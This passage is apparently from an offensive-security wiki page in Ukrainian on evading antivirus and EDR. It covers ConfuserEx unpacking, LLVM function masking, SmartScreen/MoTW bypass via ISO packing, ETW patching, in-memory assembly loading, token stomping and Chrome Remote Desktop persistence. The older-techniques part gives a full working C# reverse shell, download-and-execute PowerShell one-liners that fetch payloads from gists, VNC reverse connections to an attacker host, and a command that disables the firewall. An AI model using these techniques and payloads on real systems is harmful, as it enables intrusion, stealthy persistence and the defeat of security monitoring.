1.  Видалення захисту від підміни – ConfuserEx шифрує кожне *тіло методу* й розшифровує його в статичному конструкторі *модуля* (`<Module>.cctor`). Він також змінює контрольну суму PE, тож будь-яка модифікація призведе до аварійного завершення бінарного файла. Скористайтеся **AntiTamperKiller**, щоб знайти зашифровані таблиці метаданих, відновити XOR-ключі та перезаписати чисту збірку:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Вивід містить 6 параметрів захисту від втручання (`key0-key3`, `nameHash`, `internKey`), які можуть стати в пригоді під час створення власного unpacker.

2.  Відновлення символів / потоку керування — передайте *очищений* файл до **de4dot-cex** (форку de4dot з підтримкою ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Прапорці:
     • `-p crx` – вибрати профіль ConfuserEx 2
     • de4dot скасує flattening потоку керування, відновить початкові простори імен, класи та назви змінних і розшифрує рядки-константи.

3.  Видалення proxy-викликів – ConfuserEx замінює прямі виклики методів легкими обгортками (так званими *proxy-викликами*), щоб ще більше ускладнити декомпіляцію. Видаліть їх за допомогою **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Після цього кроку ви маєте побачити звичайні .NET API, як-от `Convert.FromBase64String` або `AES.Create()`, замість непрозорих функцій-обгорток (`Class8.smethod_10`, …).

4.  Ручне очищення – запустіть отриманий бінарний файл у dnSpy та шукайте великі Base64-блоки або використання `RijndaelManaged`/`TripleDESCryptoServiceProvider`, щоб знайти справжній payload.  Часто malware зберігає його як масив байтів у кодуванні TLV, ініціалізований усередині `<Module>.byte_0`.

Наведений ланцюжок відновлює потік виконання **без** запуску шкідливого зразка – це корисно під час роботи на офлайн-робочій станції.

> 🛈  ConfuserEx створює користувацький атрибут `ConfusedByAttribute`, який можна використовувати як IOC для автоматичного первинного аналізу зразків.

#### Однорядкова команда
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: обфускатор C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Мета цього проєкту — створити форк набору компіляторів [LLVM](http://www.llvm.org/) з відкритим вихідним кодом, що забезпечує підвищений рівень безпеки програмного забезпечення завдяки [обфускації коду](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) та захисту від несанкціонованих змін.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator демонструє, як використовувати мову `C++11/14` для генерації обфускованого коду під час компіляції без зовнішніх інструментів і без модифікації компілятора.
- [**obfy**](https://github.com/fritzone/obfy): Додає шар обфускованих операцій, згенерованих фреймворком метапрограмування шаблонів C++, що трохи ускладнить життя тому, хто захоче зламати застосунок.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz — це обфускатор бінарних файлів x64, здатний обфускувати різні PE-файли, зокрема .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame — це простий рушій метаморфного коду для довільних виконуваних файлів.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator — це фреймворк для дрібнозернистої обфускації коду мов, підтримуваних LLVM, із застосуванням ROP (return-oriented programming). ROPfuscator обфускує програму на рівні асемблерного коду, перетворюючи звичайні інструкції на ланцюжки ROP і руйнуючи наше звичне уявлення про нормальний потік керування.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt — це .NET PE Crypter, написаний мовою Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor здатний перетворювати наявні EXE/DLL на shellcode, а потім завантажувати їх

### Самомаскування окремих функцій за допомогою компілятора LLVM

Замість того щоб маскувати весь implant лише під час сну, модифікований бекенд LLVM X86 може зберігати вибрані функції XOR-маскованими, коли вони неактивні. PoC Function Peekaboo вибирає демангльовані імена, що містять `REG_`, вставляє position-independent заглушки входу/виходу навколо фінального машинного коду й розміщує один спільний обробник маскування в `.text`; сигнатури на рівні вихідного коду та угода про виклики Windows x64 залишаються незмінними.<sup>[[38]](#references)[[39]](#references)</sup>

#### Трансформація потоку керування в бекенді

Це слід виконувати після вибору інструкцій і оптимізації, оскільки трансформація має охоплювати **кожну згенеровану інструкцію повернення** та враховувати точне розташування інструкцій x86. `MachineFunctionPass`, що виконується перед генерацією коду, знаходить останній `MachineInstr::isReturn()`, видаляє його, щоб фінальний шлях переходив до доданого епілогу, а попередні інструкції повернення замінює на `JMP_1 handler`. Залишайте будь-яке згенероване компілятором очищення стека/кадру перед кожною інструкцією повернення; перенаправляйте лише саму інструкцію повернення.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` і `X86AsmPrinter::emitFunctionBodyEnd()` генерують заглушки для кожної функції, тоді як `emitEndOfAsmFile()` генерує обробник. Спільні для етапів генерації символи дають змогу гілці прологу переходити до епілогу, який буде згенеровано пізніше; для вручну згенерованого ближнього `je` запишіть `0F 84`, а потім чотирибайтовий вираз MC `target - address_after_je`. Виклики та переходи до обробника натомість можна згенерувати як об’єкти `MCInst` (`CALL64pcrel32` і `JMP_1`). Для невибраної функції pass має повертати `false`, якщо нічого не змінив; PoC помилково повертає на цьому шляху `true`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Метадані та ініціалізація до CRT

PoC розміщує в `.funcmeta` XOR-ключ і записи розміром 16 байтів, що містять вказівник на функцію з релокацією завантажувача та довжину під час виконання. Хоча поле C має тип `uint32_t`, обробник зчитує QWORD зі зміщенням `+8` у записі, захоплюючи довжину та її доповнення, і переходить до наступного запису з кроком `0x10`. Імена секцій PE мають довжину лише вісім байтів, тому під час виконання пошук знаходить `.funcmet`. Зовнішній патчер додає виконуваний `.stub`, зберігає старий RVA точки входу в заглушці та перенаправляє `AddressOfEntryPoint`; PIC-заглушка отримує базу образу з `gs:[0x60]` → `[PEB+0x10]`, проходить таблицю імпортів PE32+, щоб знайти вже імпортовану `VirtualProtect`, і запускається до CRT.<sup>[[38]](#references)[[39]](#references)</sup>

Під час ініціалізації в `gs:[0xE8]` встановлюється sentinel і викликається кожна функція з метаданих. Пролог, який постійно залишається доступним для читання, записує початок функції в `gs:[0xF0]`, перевіряє sentinel і пропускає ще не замасковане тіло. Потім епілог викликає `handler`; після збереження обробником 13 регістрів (`0x68` байтів) адреса повернення в `[rsp+0x68]` є кінцем трансформованої функції, тож `end - start` можна записати в запис метаданих. Після маскування всіх тіл заглушка очищає sentinel і переходить до `ImageBase + original_entry_point_RVA`.<sup>[[38]](#references)[[39]](#references)</sup>

Під час звичайного виклику пролог викликає той самий симетричний обробник, щоб декодувати тіло. Фінальний шлях переходить до доданого епілогу, тоді як кожне попереднє повернення переходить безпосередньо до спільного обробника. Звичайний епілог також використовує `jmp handler`, а не `call`, тому після повторного маскування інструкція `ret` обробника використовує адресу повернення початкового виклику й зберігає результат функції в `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Примітив маскування та індикатори аналізу

Обробник знаходить поточний запис, пропускає фіксований видимий пролог (у цій збірці `0x46` байтів), змінює атрибути решти області на `PAGE_EXECUTE_READWRITE`, виконує побайтовий XOR із молодшим байтом ключа, а потім встановлює `PAGE_EXECUTE_READ`. Отже, той самий цикл декодує код під час входу й кодує його під час кожного звичайного виходу.<sup>[[38]](#references)[[39]](#references)</sup>

До індикаторів із високою достовірністю для цієї реалізації належать:<sup>[[38]](#references)[[39]](#references)</sup>

- точка входу у виконуваній секції `.stub` і секція `.funcmet`, що містить ключ і релоковані вказівники на `.text`;
- розбір PEB, таблиці імпортів і таблиці секцій до CRT, після чого виконуються виклики через кожен вказівник із метаданих;
- однакові PIC-прологи `call`/`pop` і численні точки повернення, перенаправлені до одного обробника;
- записи в `gs:[0xE8]`, `gs:[0xF0]` і `gs:[0xF8]`, після яких відбуваються повторні переходи `VirtualProtect` і побайтові XOR-записи в підкріплені образом виконувані сторінки.

Це ухилення від сканерів пам’яті, а не криптографічний захист: виправлений файл усе ще містить початкове незашифроване тіло, а налагоджувач може зупинитися на `VirtualProtect` або циклі XOR і дампити активну функцію. Однобайтовий XOR, доступні для читання метадані та фіксована межа `0x46` також спрощують відновлення офлайн.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Слоти TEB у PoC є локальними для потоку, але змінені сторінки коду спільні для всього процесу. Тому одночасний або рекурсивний вхід може перемикати інструкції, поки виконується інший виклик; винятки та нетривіальні виходи також можуть обійти повторне маскування. Надійна реалізація має синхронізувати переходи, відновлювати фактичні атрибути захисту, повернуті через `lpflOldProtect`, уникати жорстко заданої довжини заглушок, перевіряти вирівнювання стека x64 на шляхах і `call`, і `jmp`, а також викликати `FlushInstructionCache` після перезапису виконуваних байтів. Microsoft прямо покладає на викликач відповідальність за когерентність кешу інструкцій під час модифікації виконуваного коду.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Можливо, ви бачили це вікно під час завантаження деяких виконуваних файлів з інтернету та їх запуску.

Microsoft Defender SmartScreen — це механізм безпеки, призначений захищати кінцевого користувача від запуску потенційно шкідливих застосунків.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen переважно використовує підхід на основі репутації: застосунки, які завантажують нечасто, викликають сповіщення SmartScreen, що попереджає кінцевого користувача й не дає запустити файл (хоча його все ще можна запустити, натиснувши More Info -> Run anyway).

**MoTW** (Mark of The Web) — це [альтернативний потік даних NTFS](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) з назвою Zone.Identifier, який автоматично створюється під час завантаження файлів з інтернету разом із URL-адресою, звідки файл було завантажено.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Перевірка ADS Zone.Identifier для файлу, завантаженого з інтернету.</p></figcaption></figure>

> [!TIP]
> Важливо зазначити, що виконувані файли, підписані **довіреним** сертифікатом підпису, **не викликають SmartScreen**.

Дуже ефективний спосіб захистити свої payloads від отримання Mark of The Web — запакувати їх у контейнер, наприклад ISO. Це працює тому, що Mark-of-the-Web (MOTW) **не можна** застосувати до томів, що **не є NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) — це інструмент, який пакує payloads у вихідні контейнери, щоб уникнути Mark-of-the-Web.

Приклад використання:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Ось демонстрація обходу SmartScreen шляхом пакування payloads у файли ISO за допомогою [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) — це потужний механізм журналювання у Windows, який дає змогу програмам і системним компонентам **записувати події**. Однак його також можуть використовувати засоби безпеки для моніторингу та виявлення шкідливої активності.

Так само, як AMSI можна вимкнути (обійти), можна змусити функцію **`EtwEventWrite`** процесу в user space негайно повертатися, не записуючи жодних подій. Для цього функцію пропатчують у пам’яті, щоб вона негайно поверталася, фактично вимикаючи журналювання ETW для цього процесу.

Детальніше можна дізнатися тут: **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) та [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## Рефлексія збірок C#

Завантаження бінарних файлів C# у пам’ять відоме вже досить давно й досі є чудовим способом запускати post-exploitation інструменти, не потрапляючи на очі AV.

Оскільки payload завантажується безпосередньо в пам’ять, не торкаючись диска, нам потрібно буде лише подбати про патчинг AMSI для всього процесу.

Більшість C2-фреймворків (sliver, Covenant, metasploit, CobaltStrike, Havoc тощо) уже дають змогу виконувати збірки C# безпосередньо в пам’яті, але для цього є різні способи:

- **Fork\&Run**

Цей метод передбачає **створення нового одноразового процесу**, ін’єкцію в нього шкідливого post-exploitation коду, виконання цього коду та завершення нового процесу після закінчення. Такий підхід має як переваги, так і недоліки. Перевага методу fork and run у тому, що виконання відбувається **поза** процесом нашого Beacon implant. Це означає, що якщо під час post-exploitation дій щось піде не так або буде виявлено, **імовірність збереження нашого implant значно вища**. Недолік у тому, що **імовірність виявлення засобами поведінкового виявлення вища**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Цей метод передбачає ін’єкцію шкідливого post-exploitation коду **у власний процес**. Так можна уникнути створення нового процесу та його сканування засобами AV, але якщо під час виконання payload щось піде не так, **імовірність втратити beacon значно вища**, оскільки процес може аварійно завершитися.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Щоб дізнатися більше про завантаження збірок C#, ознайомтеся з цією статтею [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) та їхнім InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Також можна завантажувати збірки C# **із PowerShell**. Дивіться [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) і [відео від S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Перепакування інструментів .NET у WebAssembly за допомогою NativeAOT (WasmForge)

Звичайні методи `execute-assembly` залишають впізнаваний MSIL і зрештою ініціалізують CLR. **WasmForge** натомість змінює середовище виконання: переносить проєкт C# на експериментальну ціль NativeAOT-LLVM WASI, заздалегідь компілює його у WebAssembly і вбудовує цей модуль у Windows PE-хост на основі Wazero. Отриманий процес не потребує CLR, JIT або хоста `dotnet` на цільовій системі, тому правила, що спираються лише на назви керованих збірок, завантаження CLR, AMSI або .NET ETW, втрачають пряму видимість. Це техніка ухилення/пакування, а не обхід межі привілеїв — гостьовий процес зберігає дозволи початкового інструмента та його спостережувану поведінку в ОС.<sup>[[44]](#references)[[45]](#references)</sup>

### Збирання проєкту C#

Рекомендований спосіб збирання — Docker-середовище проєкту, оскільки воно містить .NET 10 SDK, NativeAOT-LLVM workload, WASI SDK 24.0, компонувальник і залежності для підписування. Файл `.csproj` визначається автоматично; команда одноетапного збирання виконує перенесення, патчинг сумісності, компіляцію WASM, створення PE та підписування.<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

Для усунення проблем або перевірки згенерованого коду розбийте процес на `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm` і фінальну команду `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>`. Образ збірки також використовує обгортку `wasm-component-ld`, щоб уникнути кодування компонента WASI Preview 2 і створити звичайний модуль, очікуваний вбудованим середовищем виконання.<sup>[[44]](#references)[[45]](#references)</sup>

### Міст між wasm32 C# і x64 Win32

Це не прозора повторна компіляція. У NativeAOT-WASI відсутні деякі можливості BCL, орієнтовані на Windows, або їхня поведінка змінена, а гість wasm32 зазвичай виділяє чотирибайтові слоти вказівників, тоді як x64 API можуть повертати восьмибайтові вказівники. WasmForge розв'язує обидві проблеми за допомогою таких згенерованих рівнів:<sup>[[44]](#references)</sup>

1. Патчер вихідного коду виправляє семантичні відмінності, специфічні для AOT, і перенаправляє непідтримувані виклики registry, pipes, WMI, identity, directory-service, file-version, LSA та подібні виклики до помічників `Wf*`.
2. Сканер P/Invoke генерує зіставлення NativeAOT `DirectPInvoke`, щоб виклики `[DllImport]` прив'язувалися до скомпонованих символів моста C, а не динамічно завантажували оголошену DLL усередині гостя.
3. Для вказівників, переданих хосту, у C# використовується `ulong`, а в C — `uint64_t`. Загальний диспетчер передає виклик обробнику Win32 хоста; `out8_mask` позначає справжні восьмибайтові вихідні слоти, старші половини яких потрібно зберегти. Для непозначених виходів у форматі wasm32 використовується захист зі знімком і відновленням, щоб запис x64 не пошкодив сусідні чотири байти.
4. Спеціалізовані мости хоста обробляють операції, які не вписуються в загальну диспетчеризацію системних викликів, як-от доступ до кешу квитків LSA, операції Kerberos/BCrypt зі структурованими результатами, TCP-трафік KDC і LDAP-запити.

Наприклад, обгортка для `version.dll!VerQueryValueW` передає чотири адреси хоста й установлює біти 2 і 3 (`0xC`), оскільки вказівник на значення та довжина займають восьмибайтові вихідні слоти. Сама обгортка залишається загальною й передає назву DLL, назву експорту, аргументи та маску до `wf_call_v2`; хост виконує перетворення вказівників і викликає нативний API.<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### Обмеження та точки виявлення

Код із великою кількістю reflection, динамічне завантаження збірок, довільні native callbacks і складні структури x64, що повертаються в пам’ять WASM, усе ще можуть вимагати патчів для кожного інструмента або взагалі не працювати. Універсальні сокети WASI Preview 2 також можуть викликати заглушки без дій, тому підтримувані інструменти використовують host shim для конкретних протоколів. Перевіряйте кожну команду на нативній збірці, а не припускайте, що функціональність буде однаковою.<sup>[[44]](#references)[[45]](#references)</sup>

Ця техніка змінює телеметрію, а не робить payload невидимим. Виявлення може зосередитися на PE, що містить або створює модуль WASM, на поведінці середовища виконання на кшталт Wazero, незвичному виділенні та копіюванні пам’яті host/guest, узагальненій прямій диспетчеризації Win32, аномаліях підпису та ресурсів PE, а також на подальших викликах API і мережевому трафіку. Тому відсутність подій завантаження CLR, AMSI або .NET ETW не слід вважати доказом нешкідливості процесу.<sup>[[44]](#references)</sup>

## Використання інших мов програмування

Як запропоновано в [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), шкідливий код можна виконувати іншими мовами, надавши скомпрометованій машині доступ **до середовища інтерпретатора, встановленого на SMB-ресурсі під контролем атакувальника**.

Надавши доступ до бінарних файлів інтерпретаторів і середовища на SMB-ресурсі, ви зможете **виконувати довільний код цими мовами в пам’яті** скомпрометованої машини.

У репозиторії зазначено: Defender і далі сканує скрипти, але, використовуючи Go, Java, PHP тощо, ми маємо **більше можливостей для обходу статичних сигнатур**. Тестування випадкових необфускованих reverse shell скриптів цими мовами виявилося успішним.

## WebAssembly re-hosting for static-analysis evasion

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Token stomping змінює access token продукту безпеки, такого як EDR або AV. Зменшення привілеїв токена може залишити процес запущеним, водночас перешкоджаючи виконанню привілейованих дій перевірки або виправлення.

Щоб запобігти цьому, Windows може **заборонити зовнішнім процесам** отримувати handles до токенів процесів безпеки.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Використання довіреного програмного забезпечення

### Chrome Remote Desktop

Як описано в [**цьому дописі в блозі**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), достатньо просто розгорнути Chrome Remote Desktop на ПК жертви, а потім скористатися ним, щоб отримати контроль і забезпечити персистентність:<sup>[[35]](#references)</sup>
1. Завантажте програму з https://remotedesktop.google.com/, натисніть «Set up via SSH», а потім натисніть файл MSI для Windows, щоб завантажити його.
2. Запустіть інсталятор у фоновому режимі на машині жертви (потрібні права адміністратора): `msiexec /i chromeremotedesktophost.msi /qn`
3. Поверніться на сторінку Chrome Remote Desktop і натисніть «Далі». Майстер запропонує авторизуватися; натисніть кнопку «Authorize», щоб продовжити.
4. Виконайте надану команду, внісши необхідні зміни: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (параметр `--pin` задає PIN без використання GUI).
 

## Розширене ухилення від виявлення

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Ухилення від виявлення — дуже складна тема. Іноді доводиться враховувати багато різних джерел телеметрії в одній системі, тому в зрілих середовищах практично неможливо залишатися повністю непомітним.

У кожного середовища, з яким ви зіткнетеся, будуть свої сильні та слабкі сторони.

Наполегливо раджу подивитися цю доповідь від [@ATTL4S](https://twitter.com/DaniLJ94), щоб отримати початкове уявлення про передові техніки ухилення від виявлення.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Це ще одна чудова доповідь від [@mariuszbit](https://twitter.com/mariuszbit) про багаторівневе ухилення від виявлення.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Старі техніки**

### **Перевірка, які частини Defender виявляє як шкідливі**

Можна скористатися [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), який **видалятиме частини бінарного файлу**, доки **не з’ясує, яку саме частину Defender** вважає шкідливою, а потім виділить її для вас.\
Ще один інструмент, який робить **те саме, — це** [**avred**](https://github.com/dobin/avred), із відкритим вебсервісом за адресою [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

До Windows 10 усі версії Windows постачалися з **Telnet server**, який можна було встановити (від імені адміністратора), виконавши:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Зробіть так, щоб воно **запускалося** під час запуску системи, і **запустіть** його зараз:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Змінити порт telnet** (stealth) **і вимкнути firewall:**

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Завантажте звідси: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (вам потрібні завантаження bin, а не setup)

**НА ХОСТІ**: Запустіть _**winvnc.exe**_ і налаштуйте сервер:

- Увімкніть параметр _Disable TrayIcon_
- Установіть пароль у _VNC Password_
- Установіть пароль у _View-Only Password_

Потім перемістіть бінарний файл _**winvnc.exe**_ і **щойно** створений файл _**UltraVNC.ini**_ на **машину-жертву**

#### **Зворотне з'єднання**

**Зловмисник** має **запустити на своєму** **хості** бінарний файл `vncviewer.exe -listen 5900`, щоб він був **готовий** прийняти зворотне **VNC-з'єднання**. Потім на **машині-жертві**: запустіть демон winvnc командою `winvnc.exe -run` і виконайте `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ПОПЕРЕДЖЕННЯ:** Щоб залишатися непомітним, не робіть кількох речей

- Не запускайте `winvnc`, якщо він уже працює, інакше з'явиться [спливаюче вікно](https://i.imgur.com/1SROTTl.png). Перевірте, чи він працює, командою `tasklist | findstr winvnc`
- Не запускайте `winvnc` без `UltraVNC.ini` у тій самій теці, інакше відкриється [вікно конфігурації](https://i.imgur.com/rfMQWcf.png)
- Не запускайте `winvnc -h` для перегляду довідки, інакше з'явиться [спливаюче вікно](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Завантажте звідси: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

Усередині GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Тепер **запустіть lister** за допомогою `msfconsole -r file.rc` і **виконайте** **xml payload** за допомогою:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Поточний Defender дуже швидко завершить процес.**

### Компіляція власного reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Перший C# Revershell

Скомпілюйте його за допомогою:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Використовуйте це з:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# із використанням компілятора

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Автоматичне завантаження та виконання:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Список обфускаторів C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
